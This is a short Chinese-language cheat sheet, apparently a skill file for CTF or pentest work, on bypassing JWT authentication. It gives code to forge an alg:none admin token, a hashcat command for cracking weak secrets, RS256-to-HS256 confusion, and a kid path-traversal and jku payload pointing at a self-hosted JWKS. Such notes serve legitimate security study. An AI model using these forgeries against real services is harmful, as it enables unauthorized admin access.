---
name: web/jwt-bypass
description: JWT 常见缺陷：alg 混淆、弱密钥、kid 注入、jku 滥用
when_to_use: 接口用 Bearer token，payload 里有 role/admin，或被拒 401/403
categories: [web]
keywords: [jwt, token, alg none, kid, jwks, 认证绕过]
---
## 先解码

```bash
echo '<token>' | cut -d. -f1 | base64 -d 2>/dev/null; echo
echo '<token>' | cut -d. -f2 | base64 -d 2>/dev/null; echo
```
看 `alg`、`role`、`exp`、`kid`。

## 四种打法

1. **alg:none**（古老的库）
   ```python
   import base64, json
   b = lambda d: base64.urlsafe_b64encode(json.dumps(d, separators=(',',':')).encode()).rstrip(b'=').decode()
   print(b({"alg":"none","typ":"JWT"}) + "." + b({"role":"admin","user":"admin"}) + ".")
   ```

2. **弱密钥爆破**
   ```bash
   hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt
   ```
   拿到密钥后本地签一个 `role=admin`（`pyjwt` / `jwt_tool -S -p word`）。

3. **算法混淆 RS256→HS256**：服务端用 RSA 公钥验签时，把公钥当 HMAC 密钥签 HS256。

4. **kid / jku 注入**：`kid` 拼进 SQL/路径时打注入或指向自己的 JWKS：
   ```json
   {"alg":"HS256","kid":"../../../../dev/null","jku":"http://my.host/jwks.json"}
   ```
   构造 JWKS 时 `n`/`e` 用自己生成的 RSA 公钥，私钥自签。

## 拿不下时

- 检查 `exp` 是否根本没校验（改成 9999999999 试试）
- 看是否有 `/api/me`、`/admin` 直接返回 role
- cookie 里除了 token 还有 session，往往可以只改一处
